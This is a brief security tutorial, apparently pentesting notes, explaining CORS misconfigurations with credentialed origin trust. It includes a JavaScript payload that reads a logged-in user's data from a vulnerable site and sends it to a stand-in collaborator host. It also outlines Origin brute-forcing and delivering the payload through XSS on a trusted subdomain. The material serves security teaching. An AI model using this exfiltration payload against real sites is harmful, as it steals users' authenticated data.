# Cross Origin Resource Sharing
is an HTTP-header based mechanism that allows a webserver to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources.

 By default, ```XMLHttpRequest``` and ```fetch()``` follow the same-origin policy, meaning they can only request resources from the same origin the application was loaded from unless the response from other origins includes the right CORS headers.

 Consider a webserver that returns the following headers:
 ```Access-Control-Allow-Credentials: true```
 
 ```Access-Control-Allow-Origin: attacker.com```

 These headers specify that client HTTP requests from ```attacker.com``` can be made to the application and the responses can be read, with inclusion of credentials (cookies).

 To exploit this scenario - an attacker might host a malicious website that includes malicious javascript that fetches sensitive information from the vulnerable website,
 and exfiltrates the responses to an attacker controlled server:

 ```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://vulnerable.com/user-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
   location = '//BURP-COLLABORATOR/exfil?data=' + this.responseText;
};
```

In order to enumerate the domains in the CORS policy, a brute force of values in the Origin header of the request should be initiated - if a domain is trusted it should be reflected in the ```ACAO``` response header.

subdomains or other trusted origins that are vulnerable to XSS could be exploited in the following manner:
```javascript
window.location = 'https://sub.vulnerable.com/?xss=<CORS EXFILTRATION PAYLOAD>'
```
